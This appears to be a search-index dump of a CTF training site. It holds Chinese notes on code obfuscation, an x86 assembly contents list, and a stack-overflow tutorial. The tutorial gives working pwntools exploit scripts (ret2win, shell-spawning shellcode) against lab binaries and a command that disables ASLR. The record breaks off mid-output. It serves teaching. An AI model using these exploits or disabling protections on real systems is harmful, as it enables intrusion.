<p>\u6307\u4ee4\u5e8f\u5217\u770b\u8d77\u6765\u5f88\u6e05\u6670\uff0c\u6240\u4ee5\u6270\u4e71\u6307\u4ee4\u5e8f\u5217\u5c31\u662f\u8981\u6253\u4e71\u8fd9\u79cd\u6307\u4ee4\u7684\u6392\u5217\u65b9\u5f0f\uff0c\u4ee5\u5e72\u6270\u5206\u6790\u8005\uff1a</p> <pre><code>01003689    push eax\n0100368A    jmp short 01003694\n0100368C    xor eax, eax\n0100368E    jmp short 01003697\n01003690    jne short 0100369F\n01003692    jmp short 0100369C\n01003694    push ebx\n01003695    jmp short 0100368C\n01003697    cmp eax, 0\n0100369A    jmp short 01003690\n0100369C    inc eax\n0100369D    jmp short 01003697\n0100369F    pop ebx\n010036A0    pop eax\n</code></pre> <p>\u867d\u7136\u770b\u8d77\u6765\u5f88\u4e71\uff0c\u4f46\u771f\u5b9e\u7684\u6267\u884c\u987a\u5e8f\u6ca1\u6709\u6539\u53d8\u3002</p>"},{"location":"Training/Material/Reverse/#_68","title":"\u591a\u5206\u652f","text":"<p>\u591a\u5206\u652f\u662f\u6307\u5229\u7528\u4e0d\u540c\u7684\u6761\u4ef6\u8df3\u8f6c\u6307\u4ee4\u5c06\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\u590d\u6742\u5316\u3002\u4e0e\u6270\u4e71\u6307\u4ee4\u5e8f\u5217\u4e0d\u540c\u7684\u65f6\uff0c\u591a\u5206\u652f\u6539\u53d8\u4e86\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u3002\u4e3e\u4e2a\u4f8b\u5b50\uff1a</p> <pre><code>01003689    push eax\n0100368A    push ebx\n0100368B    push ecx\n0100368C    push edx\n</code></pre> <p>\u53d8\u5f62\u5982\u4e0b\uff1a</p> <pre><code>01003689    push eax\n0100368A    je short 0100368F\n0100368C    push ebx\n0100368D    jmp short 01003690\n0100368F    push ebx\n01003690    push ecx\n01003691    push edx\n</code></pre> <p>\u4ee3\u7801\u91cc\u52a0\u5165\u4e86\u4e00\u4e2a\u6761\u4ef6\u5206\u652f\uff0c\u4f46\u5b83\u7a76\u7adf\u4f1a\u4e0d\u4f1a\u89e6\u53d1\u6211\u4eec\u5e76\u4e0d\u5173\u5fc3\u3002\u4e8e\u662f\u7a0b\u5e8f\u5177\u6709\u4e86\u4e0d\u786e\u5b9a\u6027\uff0c\u9700\u8981\u5728\u6267\u884c\u65f6\u624d\u80fd\u786e\u5b9a\u3002\u4f46\u53ef\u4ee5\u80af\u5b9a\u7684\u65f6\uff0c\u8fd9\u6bb5\u4ee3\u7801\u7684\u6267\u884c\u7ed3\u679c\u548c\u539f\u4ee3\u7801\u76f8\u540c\u3002</p> <p>\u518d\u6539\u8fdb\u4e00\u4e0b\uff0c\u7528\u4e0d\u540c\u7684\u4ee3\u7801\u66ff\u6362\u5206\u652f\u5904\u7684\u4ee3\u7801\uff1a</p> <pre><code>01003689    push eax\n0100368A    je short 0100368F\n0100368C    push ebx\n0100368D    jmp short 01003693\n0100368F    push eax\n01003690    mov dword ptr [esp], ebx\n01003693    push ecx\n01003694    push edx\n</code></pre>"},{"location":"Training/Material/Reverse/#_69","title":"\u4e0d\u900f\u660e\u8c13\u8bcd","text":"<p>\u4e0d\u900f\u660e\u8c13\u8bcd\u662f\u6307\u4e00\u4e2a\u8868\u8fbe\u5f0f\u7684\u503c\u5728\u6267\u884c\u5230\u67d0\u5904\u65f6\uff0c\u5bf9\u7a0b\u5e8f\u5458\u800c\u8a00\u662f\u5df2\u77e5\u7684\uff0c\u4f46\u7f16\u8bd1\u5668\u6216\u9759\u6001\u5206\u6790\u5668\u65e0\u6cd5\u63a8\u65ad\u51fa\u8fd9\u4e2a\u503c\uff0c\u53ea\u80fd\u5728\u8fd0\u884c\u65f6\u786e\u5b9a\u3002\u4e0a\u9762\u7684\u591a\u5206\u652f\u5176\u5b9e\u4e5f\u662f\u5229\u7528\u4e86\u4e0d\u900f\u660e\u8c13\u8bcd\u3002</p> <p>\u4e0b\u9762\u7684\u4ee3\u7801\u4e2d\uff1a</p> <pre><code>mov esi, 1\n... ; some code not touching esi\ndec esi\n...\ncmp esi, 0\njz real_code\n; fake luggage\nreal_code:\n</code></pre> <p>\u5047\u8bbe\u6211\u4eec\u77e5\u9053\u8fd9\u91cc esi \u7684\u503c\u80af\u5b9a\u662f 0\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5728 fake luggage \u5904\u63d2\u5165\u4efb\u610f\u957f\u5ea6\u548c\u590d\u6742\u5ea6\u7684\u6307\u4ee4\uff0c\u4ee5\u8fbe\u5230\u6df7\u6dc6\u7684\u76ee\u7684\u3002</p> <p>\u5176\u5b83\u7684\u4f8b\u5b50\u8fd8\u6709\uff08\u540c\u6837\u5047\u8bbeesi\u4e3a0\uff09\uff1a</p> <pre><code>add eax, ebx\nmul ecx\nadd eax, esi\n</code></pre>"},{"location":"Training/Material/Reverse/#_70","title":"\u95f4\u63a5\u6307\u9488","text":"<pre><code>dummy_data1 db      100h dup (0)\nmessage1    db      'hello world', 0\n\ndummy_data2 db      200h dup (0)\nmessage2    db      'another message', 0\n\nfunc        proc\n            ...\n            mov     eax, offset dummy_data1\n            add     eax, 100h\n            push    eax\n            call    dump_string\n            ...\n            mov     eax, offset dummy_data2\n            add     eax, 200h\n            push    eax\n            call    dump_string\n            ...\nfunc        endp\n</code></pre> <p>\u8fd9\u91cc\u901a\u8fc7 dummy_data \u6765\u95f4\u63a5\u5730\u5f15\u7528 message\uff0c\u4f46 IDA \u5c31\u4e0d\u80fd\u6b63\u786e\u5730\u5206\u6790\u5230\u5bf9 message \u7684\u5f15\u7528\u3002</p>"},{"location":"Training/Material/Reverse/#_71","title":"\u4ee3\u7801\u865a\u62df\u5316","text":"<p>\u57fa\u4e8e\u865a\u62df\u673a\u7684\u4ee3\u7801\u4fdd\u62a4\u4e5f\u53ef\u4ee5\u7b97\u662f\u4ee3\u7801\u6df7\u6dc6\u6280\u672f\u7684\u4e00\u79cd\uff0c\u662f\u76ee\u524d\u5404\u79cd\u6df7\u6dc6\u4e2d\u4fdd\u62a4\u6548\u679c\u6700\u597d\u7684\u3002\u7b80\u5355\u5730\u8bf4\uff0c\u8be5\u6280\u672f\u5c31\u662f\u901a\u8fc7\u8bb8\u591a\u6a21\u62df\u4ee3\u7801\u6765\u6a21\u62df\u88ab\u4fdd\u62a4\u7684\u4ee3\u7801\u7684\u6267\u884c\uff0c\u7136\u540e\u8ba1\u7b97\u51fa\u4e0e\u88ab\u4fdd\u62a4\u4ee3\u7801\u6267\u884c\u65f6\u76f8\u540c\u7684\u7ed3\u679c\u3002</p> <pre><code>+------------+\n| \u5934\u90e8\u6307\u4ee4\u5e8f\u5217 | -------&gt; | \u4ee3\u7801\u865a\u62df\u673a\u5165\u53e3 |\n|------------|                  |\n|            |          | \u4fdd\u5b58\u4ee3\u7801\u73b0\u573a |\n|            |                  |\n| \u4e2d\u95f4\u6307\u4ee4\u5e8f\u5217 |          | \u6a21\u62df\u6267\u884c\u4e2d\u95f4\u6307\u4ee4\u5e8f\u5217 |\n|            |                  |\n|            |          | \u8bbe\u7f6e\u65b0\u7684\u4ee3\u7801\u73b0\u573a |\n|------------|                  |\n| \u5c3e\u90e8\u6307\u4ee4\u5e8f\u5217 | &lt;------- | \u4ee3\u7801\u865a\u62df\u673a\u51fa\u53e3 |\n+------------+\n</code></pre> <p>\u5f53\u539f\u59cb\u6307\u4ee4\u6267\u884c\u5230\u6307\u4ee4\u5e8f\u5217\u7684\u5f00\u59cb\u5904\uff0c\u5c31\u8f6c\u5165\u4ee3\u7801\u865a\u62df\u673a\u7684\u5165\u53e3\u3002\u6b64\u65f6\u9700\u8981\u4fdd\u5b58\u5f53\u524d\u7ebf\u7a0b\u7684\u4e0a\u4e0b\u6587\u4fe1\u606f\uff0c\u7136\u540e\u8fdb\u5165\u6a21\u62df\u6267\u884c\u9636\u6bb5\uff0c\u8be5\u9636\u6bb5\u662f\u4ee3\u7801\u865a\u62df\u673a\u7684\u6838\u5fc3\u3002\u6709\u4e24\u79cd\u65b9\u6848\u6765\u4fdd\u8bc1\u865a\u62df\u673a\u4ee3\u7801\u4e0e\u539f\u59cb\u4ee3\u7801\u7684\u6808\u7a7a\u95f4\u4f7f\u7528\u4e92\u4e0d\u51b2\u7a81\uff0c\u4e00\u79cd\u662f\u5728\u5806\u4e0a\u5f00\u8f9f\u5f00\u8f9f\u65b0\u7684\u7a7a\u95f4\uff0c\u53e6\u4e00\u79cd\u662f\u7ee7\u7eed\u4f7f\u7528\u539f\u59cb\u4ee3\u7801\u6240\u4f7f\u7528\u7684\u6808\u7a7a\u95f4\uff0c\u8fd9\u4e24\u79cd\u65b9\u6848\u4e92\u6709\u4f18\u52a3\uff0c\u5728\u5b9e\u9645\u4e2d\u7b2c\u4e8c\u79cd\u4f7f\u7528\u8f83\u591a\u3002</p> <p>\u5bf9\u4e8e\u600e\u6837\u6a21\u62df\u539f\u59cb\u4ee3\u7801\uff0c\u540c\u6837\u6709\u4e24\u79cd\u65b9\u6848\u3002\u4e00\u79cd\u662f\u5c06\u539f\u672c\u7684\u6307\u4ee4\u5e8f\u5217\u8f6c\u53d8\u4e3a\u4e00\u79cd\u5177\u6709\u76f4\u63a5\u6216\u8005\u95f4\u63a5\u5bf9\u5e94\u5173\u7cfb\u7684\uff0c\u53ea\u6709\u865a\u62df\u673a\u624d\u80fd\u7406\u89e3\u7684\u4ee3\u7801\u6570\u636e\u3002\u4f8b\u5982\u7528 <code>0</code> \u6765\u8868\u793a <code>push</code>\uff0c 1 \u8868\u793a <code>mov</code> \u7b49\u3002\u8fd9\u79cd\u76f4\u63a5\u6216\u95f4\u63a5\u7b49\u4ef7\u7684\u6570\u636e\u79f0\u4e3a opcode\u3002\u53e6\u4e00\u79cd\u65b9\u6848\u662f\u5c06\u539f\u59cb\u4ee3\u7801\u7684\u610f\u4e49\u76f4\u63a5\u8f6c\u6362\u6210\u65b0\u7684\u4ee3\u7801\uff0c\u7c7b\u4f3c\u4e8e\u4ee3\u7801\u53d8\u5f62\uff0c\u8fd9\u79cd\u65b9\u6848\u57fa\u4e8e\u6307\u4ee4\u8bed\u4e49\uff0c\u6240\u4ee5\u8bbe\u8ba1\u96be\u5ea6\u975e\u5e38\u5927\u3002</p>"},{"location":"Training/Material/X86_Assembly/","title":"X86 Assembly","text":"<p>From Wikibooks, the open-content textbooks collection</p>"},{"location":"Training/Material/X86_Assembly/#contents","title":"Contents","text":"<p>\u2022 1 Introduction</p> <p>\u2022 1.1 Why Learn Assembly?</p> <p>\u2022 1.2 Who is This Book For?</p> <p>\u2022 1.3 How is This Book Organized?</p> <p>\u2022 2 Basic FAQ</p> <p>\u2022 2.1 How Does the Computer Read/Understand Assembly?</p> <p>\u2022 2.2 Is it the Same On Windows/DOS/Linux?</p> <p>\u2022 2.3 Which Assembler is Best?</p> <p>\u2022 2.4 Do I Need to Know Assembly?</p> <p>\u2022 2.5 How Should I Format my Code?</p> <p>\u2022 3 X86 Family</p> <p>\u2022 3.1 Intel x86 Microprocessors</p> <p>\u2022 3.2 AMD x86 Compatible Microprocessors</p> <p>\u2022 4 X86 Architecture</p> <p>\u2022 4.1 x86 Architecture</p> <p>\u2022 4.1.1 General Purpose Registers (GPR)</p> <p>\u2022 4.1.2 Segment Registers</p> <p>\u2022 4.1.3 EFLAGS Register</p> <p>\u2022 4.1.4 Instruction Pointer</p> <p>\u2022 4.1.5 Memory</p> <p>\u2022 4.1.6 Two's complement representation</p> <p>\u2022 4.1.7 Addressing modes</p> <p>\u2022 4.2 Stack</p> <p>\u2022 4.3 CPU Operation Modes</p> <p>\u2022 4.3.1 Real Mode</p> <p>\u2022 4.3.2 Protected Mode</p> <p>\u2022 4.3.2.1 Flat Memory Model</p> <p>\u2022 4.3.2.2 Multi-Segmented Memory Model</p> <p>\u2022 5 Comments</p> <p>\u2022 5.1 Comments</p> <p>\u2022 5.2 HLA Comments</p> <p>\u2022 6 16 32 and 64 Bits</p> <p>\u2022 6.1 The 8086 Registers</p> <p>\u2022 6.1.1 Example</p> <p>\u2022 6.2 The A20 Gate Saga</p> <p>\u2022 6.3 32-Bit Addressing</p> <p>\u2022 7 X86 Instructions</p> <p>\u2022 7.1 Conventions</p> <p>\u2022 8 Data Transfer</p> <p>\u2022 8.1 Data transfer instructions</p> <p>\u2022 8.1.1 Move</p> <p>\u2022 8.1.2 Data Swap</p> <p>\u2022 8.1.3 Move and Extend</p> <p>\u2022 8.1.4 Move by Data Size</p>"},{"location":"Training/Material/X86_Assembly/#pdf","title":"PDF","text":"<p>X86 Assembly.pdf</p>"},{"location":"Training/Material/pwn-stack-1/","title":"Binary Exploitation - Stack","text":"<p>https://ir0nstone.gitbook.io/notes/</p>"},{"location":"Training/Material/pwn-stack-1/#introduction","title":"Introduction","text":"<p>An Introduction to binary exploitation</p> <p>Binary Exploitation is about finding vulnerabilities in programs and utilizing them to do what you wish. Sometimes this can result in an authentication bypass or the leaking of classified information, but occasionally (if you're lucky) it can also result in Remote Code Execution (RCE). The most basic forms of binary exploitation occur on the stack, a region of memory that stores temporary variables created by functions in code.</p> <p>When a new function is called, a memory address in the calling function is pushed to the stack - this way, the program knows where to return to once the called function finishes execution. Let's look at a basic binary to show this.</p> <p>introduction.zip</p>"},{"location":"Training/Material/pwn-stack-1/#analysis","title":"Analysis","text":"<p>The binary has two files - <code>source.c</code> and <code>vuln</code>; the latter is an <code>ELF</code> file, which is the executable format for Linux (it is recommended to follow along with this with a Virtual Machine of your own, preferably Linux).</p> <p>We're gonna use a tool called <code>radare2</code> to analyze the behavior of the binary when functions are called.</p> <pre><code>$ r2 -d -A vuln\n</code></pre> <p>The <code>-d</code> runs it while the <code>-A</code> performs the analysis. We can disassemble the <code>main</code> with</p> <pre><code>s main; pdf\n</code></pre> <p><code>s main</code> seeks (moves) to main, while <code>pdf</code> stands for Print Disassembly Function (literally just disassembles it).</p> <pre><code>0x080491ab      55             push ebp\n0x080491ac      89e5           mov ebp, esp\n0x080491ae      83e4f0         and esp, 0xfffffff0\n0x080491b1      e80d000000     call sym.__x86.get_pc_thunk.ax\n0x080491b6      054a2e0000     add eax, 0x2e4a\n0x080491bb      e8b2ffffff     call sym.unsafe\n0x080491c0      90             nop\n0x080491c1      c9             leave\n0x080491c2      c3             ret\n</code></pre> <p>The call to <code>unsafe</code> is at <code>0x080491bb</code>, so let's break there.</p> <pre><code>db 0x080491bb\n</code></pre> <p><code>db</code> stands for debug breakpoint and just sets a breakpoint. A breakpoint is simply somewhere that pauses the program for you to run other commands when reached. Now we run <code>dc</code> for debug continue; this just carries on running the file.</p> <p>It should break before <code>unsafe</code> is called; let's analyze the top of the stack now:</p> <pre><code>[0x08049172]&gt; pxw @ esp\n0xff984af0 0xf7efe000         [...]\n</code></pre> <p>The first address, <code>0xff984af0</code>, is the position; the <code>0xf7efe000</code> is the value. Let's move one more instruction with the <code>ds</code>, debug step, and check the stack again.</p> <pre><code>[0x08049172]&gt; pxw @ esp\n0xff984aec  0x080491c0 0xf7efe000\n</code></pre> <p>Huh, something's been pushed onto the stack - the value <code>0x080491c0</code>. This looks like it's in the binary - but where?</p> <pre><code>[...]\n0x080491b6      054a2e0000     add eax, 0x2e4a\n0x080491bb      e8b2ffffff     call sym.unsafe\n0x080491c0      90             nop\n[...]\n</code></pre> <p>Look at that - it's the instruction after the call to <code>unsafe</code>. Why? This is how the program knows where to return to after <code>*unsafe()*</code> has finished.</p>"},{"location":"Training/Material/pwn-stack-1/#weaknesses","title":"Weaknesses","text":"<p>But as we're interested in binary exploitation, let's see how we can possibly break this. First, let's disassemble <code>unsafe</code> and break on the <code>ret</code> instruction; <code>ret</code> is the equivalent of <code>pop eip</code>, which will get the saved return pointer we just analyzed on the stack into the <code>eip</code> register. Then let's continue and spam a bunch of characters into the input and see how that could affect it.</p> <pre><code>[0x08049172]&gt; db 0x080491aa\n[0x08049172]&gt; dc\nOverflow me\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n</code></pre> <p>Now let's read the value at the location the return pointer was at previously, which as we saw was <code>0xff984aec</code>.</p> <pre><code>[0x080491aa]&gt; pxw @ 0xff984aec\n0xff984aec  0x41414141 0x41414141 0x41414141 0x41414141  AAAAAAAAAAAAAAAA\n</code></pre> <p>Huh?</p> <p>It's quite simple - we inputted more data than the program expected, which resulted in us overwriting more of the stack than the developer expected. The saved return pointer is also on the stack, meaning we managed to overwrite it. As a result, on the <code>ret</code>, the value popped into <code>eip</code> won't be in the previous function but rather <code>0x41414141</code>. Let's check with <code>ds</code>.</p> <pre><code>[0x080491aa]&gt; ds\n[0x41414141]&gt;\n</code></pre> <p>And look at the new prompt - <code>0x41414141</code>. Let's run <code>dr eip</code> to make sure that's the value in <code>eip</code>:</p> <pre><code>[0x41414141]&gt; dr eip\n0x41414141\n</code></pre> <p>Yup, it is! We've successfully hijacked the program execution! Let's see if it crashes when we let it run with <code>dc</code>.</p> <pre><code>[0x41414141]&gt; dc\nchild stopped with signal 11\n[+] SIGNAL 11 errno=0 addr=0x41414141 code=1 ret=0\n</code></pre> <p><code>radare2</code> is very useful and prints out the address that causes it to crash. If you cause the program to crash outside of a debugger, it will usually say <code>Segmentation Fault</code>, which could mean a variety of things, but usually that you have overwritten EIP.</p> <p>Of course, you can prevent people from writing more characters than expected when making your program, usually using other C functions such as <code>fgets()</code>; <code>gets()</code> is intrinsically unsafe because it doesn't check the length of the input, meaning that the presence of <code>gets()</code> is always something you should check out in a program. It is also possible to give <code>fgets()</code> the wrong parameters, meaning it still takes in too many characters.</p>"},{"location":"Training/Material/pwn-stack-1/#summary","title":"Summary","text":"<p>When a function calls another function, it</p> <ul> <li>pushes a return pointer to the stack so the called function knows where to return</li> <li>when the called function finishes execution, it pops it off the stack again</li> </ul> <p>Because this value is saved on the stack, just like our local variables, if we write more characters than the program expects, we can overwrite the value and redirect code execution to wherever we wish. Functions such as <code>fgets()</code> can prevent such easy overflow, but you should check how much is actually being read.</p>"},{"location":"Training/Material/pwn-stack-1/#ret2win","title":"ret2win","text":"<p>The most basic binexp challenge</p> <p>A ret2win is simply a binary where there is a <code>win()</code> function (or equivalent); once you successfully redirect execution there, you complete the challenge.</p> <p>To carry this out, we have to leverage what we learned in the introduction, but in a predictable manner - we have to overwrite EIP, but to a specific value of our choice.</p> <p>To do this, what do we need to know? Well, a couple of things:</p> <ul> <li>The padding until we begin to overwrite the return pointer (EIP)</li> <li>What value do we want to overwrite EIP to</li> </ul> <p>When I say \"overwrite EIP\", I mean overwrite the saved return pointer that gets popped into EIP. The EIP register is not located on the stack, so it is not overwritten directly.</p> <p>ret2win.zip</p>"},{"location":"Training/Material/pwn-stack-1/#finding-the-padding","title":"Finding the Padding","text":"<p>This can be found using simple trial and error; if we send a variable number of characters, we can use the <code>Segmentation Fault</code> message, in combination with radare2, to tell when we overwrote EIP. There is a better way to do it than simple brute force (we'll cover this in the next post), but it'll do for now.</p> <p>You may get a segmentation fault for reasons other than overwriting EIP; use a debugger to make sure the padding is correct.</p> <p>We get an offset of 52 bytes.</p>"},{"location":"Training/Material/pwn-stack-1/#finding-the-address","title":"Finding the Address","text":"<p>Now we need to find the address of the <code>flag()</code> function in the binary. This is simple.</p> <pre><code>$ r2 -d -A vuln\n$ afl\n[...]\n0x080491c3    1 43           sym.flag\n[...]\n</code></pre> <p><code>afl</code> stands for Analyse Functions List</p> <p>The <code>flag()</code> function is at <code>0x080491c3</code>.</p>"},{"location":"Training/Material/pwn-stack-1/#using-the-information","title":"Using the Information","text":"<p>The final piece of the puzzle is to work out how we can send the address we want. If you think back to the introduction, the <code>A</code>s that we sent became <code>0x41</code> - which is the ASCII code of <code>A</code>. So the solution is simple - let's just find the characters with ASCII codes <code>0x08</code>, <code>0x04</code>, <code>0x91</code>, and <code>0xc3</code>.</p> <p>This is a lot simpler than you might think because we can specify them in Python as hex:</p> <pre><code>address = '\\x08\\x04\\x91\\xc3'\n</code></pre> <p>And that makes it much easier.</p>"},{"location":"Training/Material/pwn-stack-1/#putting-it-together","title":"Putting it Together","text":"<p>Now we know the padding and the value, let's exploit the binary! We can use <code>pwntools</code> to interface with the binary (check out the pwntools posts for a more in-depth look).</p> <pre><code>from pwn import *        # This is how we import pwntools\n\np = process('./vuln')    # We're starting a new process\n\npayload = 'A' * 52\npayload += '\\x08\\x04\\x91\\xc3'\n\np.clean()                # Receive all the text\n\np.sendline(payload)\n\nlog.info(p.clean())      # Output the \"Exploited!\" string to know we succeeded\n</code></pre> <p>If you run this, there is one small problem: it won't work. Why? Let's check with a debugger. We'll put a <code>pause()</code> to give us time to attach <code>radare2</code> to the process.</p> <pre><code>from pwn import *\n\np = process('./vuln')\n\npayload = b'A' * 52\npayload += '\\x08\\x04\\x91\\xc3'\n\nlog.info(p.clean())\n\npause()        # add this in\n\np.sendline(payload)\n\nlog.info(p.clean())\n</code></pre> <p>Now let's run the script with <code>python3 exploit.py</code> and then open up a new terminal window.</p> <pre><code>r2 -d -A $(pidof vuln)\n</code></pre> <p>By providing the PID of the process, radare2 hooks onto it. Let's break at the return of <code>unsafe()</code> and read the value of the return pointer.</p> <pre><code>[0x08049172]&gt; db 0x080491aa\n[0x08049172]&gt; dc\n\n&lt;&lt; press any button on the exploit terminal window &gt;&gt;\n\nhit breakpoint at: 80491aa\n[0x080491aa]&gt; pxw @ esp\n0xffdb0f7c  0xc3910408 [...]\n[...]\n</code></pre> <p><code>0xc3910408</code> - look familiar? It's the address we were trying to send over, except the bytes have been reversed, and the reason for this reversal is endianness. Big-endian systems store the most significant byte (the byte with the largest value) at the smallest memory address, and this is how we sent them. Little-endian does the opposite (for a reason), and most binaries you will come across are little-endian. As far as we're concerned, the byte is stored in reverse order in little-endian executables.</p>"},{"location":"Training/Material/pwn-stack-1/#finding-the-endianness","title":"Finding the Endianness","text":"<p><code>radare2</code> comes with a nice tool called <code>rabin2</code> for binary analysis:</p> <pre><code>$ rabin2 -I vuln\n[...]\nendian   little\n[...]\n</code></pre> <p>So our binary is little-endian.</p>"},{"location":"Training/Material/pwn-stack-1/#accounting-for-endianness","title":"Accounting for Endianness","text":"<p>The fix is simple - reverse the address (you can also remove the <code>pause()</code>)</p> <pre><code>payload += '\\x08\\x04\\x91\\xc3'[::-1]\n</code></pre> <p>If you run this now, it will work:</p> <pre><code>$ python3 tutorial.py \n[+] Starting local process './vuln': pid 2290\n[*] Overflow me\n[*] Exploited!!!!!\n</code></pre> <p>And wham, you've called the <code>flag()</code> function! Congrats!</p>"},{"location":"Training/Material/pwn-stack-1/#pwntools-and-endianness","title":"Pwntools and Endianness","text":"<p>Unsurprisingly, you're not the first person to have thought \"Could they possibly make endianness simpler\" - luckily, pwntools has a built-in <code>p32()</code> function ready for use!</p> <pre><code>payload += '\\x08\\x04\\x91\\xc3'[::-1]\n</code></pre> <p>becomes</p> <pre><code>payload += p32(0x080491c3)\n</code></pre> <p>Much simpler, right?</p> <p>The only caveat is that it returns <code>bytes</code> rather than a string, so you have to make the padding a byte string:</p> <pre><code>payload = b'A' * 52        # Notice the \"b\"\n</code></pre> <p>Otherwise, you will get a</p> <pre><code>TypeError: can only concatenate str (not \"bytes\") to str\n</code></pre>"},{"location":"Training/Material/pwn-stack-1/#final-exploit","title":"Final Exploit","text":"<pre><code>from pwn import *            # This is how we import pwntools\n\np = process('./vuln')        # We're starting a new process\n\npayload = b'A' * 52\npayload += p32(0x080491c3)   # Use pwntools to pack it\n\nlog.info(p.clean())          # Receive all the text\np.sendline(payload)\n\nlog.info(p.clean())          # Output the \"Exploited!\" string to know we succeeded\n</code></pre>"},{"location":"Training/Material/pwn-stack-1/#de-bruijn-sequences","title":"De Bruijn Sequences","text":"<p>The better way to calculate offsets</p> <p>De Bruijn sequences of order <code>n</code> is simply a sequence where no string of <code>n</code> characters is repeated. This makes finding the offset until EIP much simpler - we can just pass in a De Bruijn sequence, get the value within EIP and find the one possible match within the sequence to calculate the offset. Let's do this on the ret2win binary.</p>"},{"location":"Training/Material/pwn-stack-1/#generating-the-pattern","title":"Generating the Pattern","text":"<p>Again, <code>radare2</code> comes with a nice command-line tool (called <code>ragg2</code>) that can generate it for us. Let's create a sequence of length <code>100</code>.</p> <pre><code>$ ragg2 -P 100 -r\nAAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh\n</code></pre> <p>The <code>-P</code> specifies the length while <code>-r</code> tells it to show ascii bytes rather than hex pairs.</p>"},{"location":"Training/Material/pwn-stack-1/#using-the-pattern","title":"Using the Pattern","text":"<p>Now we have the pattern, let's just input it in <code>radare2</code> when prompted for input, make it crash, and then calculate how far along the sequence the EIP is. Simples.</p> <pre><code>$ r2 -d -A vuln\n\n[0xf7ede0b0]&gt; dc\nOverflow me\nAAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh\nchild stopped with signal 11\n[+] SIGNAL 11 errno=0 addr=0x41534141 code=1 ret=0\n</code></pre> <p>The address it crashes on is <code>0x41534141</code>; we can use <code>radare2</code>'s in-built <code>wopO</code> command to work out the offset.</p> <pre><code>[0x41534141]&gt; wopO 0x41534141\n52\n</code></pre> <p>Awesome - we get the correct value!</p> <p>We can also be lazy and not copy the value.</p> <pre><code>[0x41534141]&gt; wopO `dr eip`\n52\n</code></pre> <p>The backticks mean the <code>dr eip</code> is calculated first before the <code>wopO</code> is run on the result of it.</p>"},{"location":"Training/Material/pwn-stack-1/#shellcode","title":"Shellcode","text":"<p>Running your own code</p> <p>In real exploits, it's not particularly likely that you will have a <code>win()</code> function lying around - shellcode is a way to run your own instructions, giving you the ability to run arbitrary commands on the system.</p> <p>Shellcode is essentially assembly instructions, except we input them into the binary; once we input it, we overwrite the return pointer to hijack code execution and point at our own instructions!</p> <p>I promise you can trust me but you should never ever run shellcode without knowing what it does. Pwntools is safe and has almost all the shellcode you will ever need.</p> <p>The reason shellcode is successful is that Von Neumann architecture (the architecture used in most computers today) does not differentiate between data and instructions - it doesn't matter where or what you tell it to run, it will attempt to run it.  Therefore, even though our input is data, the computer doesn't know that - and we can use that to our advantage.</p> <p>shellcode.zip</p>"},{"location":"Training/Material/pwn-stack-1/#disabling-aslr","title":"Disabling ASLR","text":"<p>ASLR is a security technique, and while it is not specifically designed to combat shellcode, it involves randomizing certain aspects of memory (we will talk about it in much more detail later). This randomization can make shellcode exploits like the one we're about to do less reliable, so we'll be disabling it, for now, using this.</p> <pre><code>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space\n</code></pre> <p>Again, you should never run commands if you don't know what they do</p>"},{"location":"Training/Material/pwn-stack-1/#finding-the-buffer-in-memory","title":"Finding the Buffer in Memory","text":"<p>Let's debug <code>vuln()</code> using <code>radare2</code> and work out where in memory the buffer starts; this is where we want to point the return pointer to.</p> <pre><code>$ r2 -d -A vuln\n\n[0xf7fd40b0]&gt; s sym.unsafe ; pdf\n[...]\n; var int32_t var_134h @ ebp-0x134\n[...]\n</code></pre> <p>This value that gets printed out is a local variable - due to its size, it's fairly likely to be the buffer. Let's set a breakpoint just after <code>gets()</code> and find the exact address.</p> <pre><code>[0x08049172]&gt; dc\nOverflow me\n&lt;&lt;Found me&gt;&gt;                    &lt;== This was my input\nhit breakpoint at: 80491a8\n[0x080491a8]&gt; px @ ebp - 0x134\n- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF\n0xffffcfb4  3c3c 466f 756e 6420 6d65 3e3e 00d1 fcf7  &lt;&lt;Found me&gt;&gt;....\n\n[...]\n</code></pre> <p>It appears to be at <code>0xffffcfd4</code>; if we run the binary multiple times, it should remain where it is (if it doesn't, make sure ASLR is disabled!).</p>"},{"location":"Training/Material/pwn-stack-1/#finding-the-padding_1","title":"Finding the Padding","text":"<p>Now we need to calculate the padding until the return pointer. We'll use the De Bruijn sequence as explained in the previous blog post.</p> <pre><code>$ ragg2 -P 400 -r\n&lt;copy this&gt;\n\n$ r2 -d -A vuln\n[0xf7fd40b0]&gt; dc\nOverflow me\n&lt;&lt;paste here&gt;&gt;\n[0x73424172]&gt; wopO `dr eip`\n312\n</code></pre> <p>The padding is 312 bytes.</p>"},{"location":"Training/Material/pwn-stack-1/#putting-it-all-together","title":"Putting it all together","text":"<p>In order for the shellcode to be correct, we're going to set the <code>context.binary</code> to our binary; this grabs stuff like the arch, OS, and bits and enables pwntools to provide us with working shellcode.</p> <pre><code>from pwn import *\n\ncontext.binary = ELF('./vuln')\n\np = process()\n</code></pre> <p>We can use just <code>process()</code> because once the <code>context.binary</code> is set it is assumed to use that process</p> <p>Now we can use pwntools' awesome shellcode functionality to make it incredibly simple.</p> <pre><code>payload = asm(shellcraft.sh())          # The shellcode\npayload = payload.ljust(312, b'A')      # Padding\npayload += p32(0xffffcfb4)              # Address of the Shellcode\n</code></pre> <p>Yup, that's it. Now let's send it off and use <code>p.interactive()</code>, which enables us to communicate to the shell.</p> <pre><code>log.info(p.clean())\n\np.sendline(payload)\n\np.interactive()\n</code></pre> <p>If you're getting an <code>EOFError</code>, print out the shellcode and try to find it in memory - the stack address may be wrong</p> <pre><code>$ python3 exploit.py\n[*] 'vuln'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX disabled\n    PIE:      No PIE (0x8048000)\n    RWX:      Has RWX segments\n[+] Starting local process 'vuln': pid 